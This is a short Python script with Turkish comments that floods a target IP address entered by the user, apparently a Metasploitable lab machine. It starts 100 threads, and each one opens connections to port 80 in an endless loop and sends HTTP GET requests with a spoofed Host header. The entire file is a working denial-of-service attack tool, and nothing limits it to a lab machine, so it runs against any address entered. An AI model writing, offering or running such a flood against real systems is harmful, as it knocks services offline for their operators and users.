import socket
import threading

target = input("Hedef IP adresini gir: ")  # Metasploitable IP string olarak alınıyor
port = 80
fake_ip = "182.21.20.32"

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            payload = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n"
            s.send(payload.encode())
            s.close()
        except:
            pass

for i in range(100):  # Thread sayısı
    thread = threading.Thread(target=attack)
    thread.start()
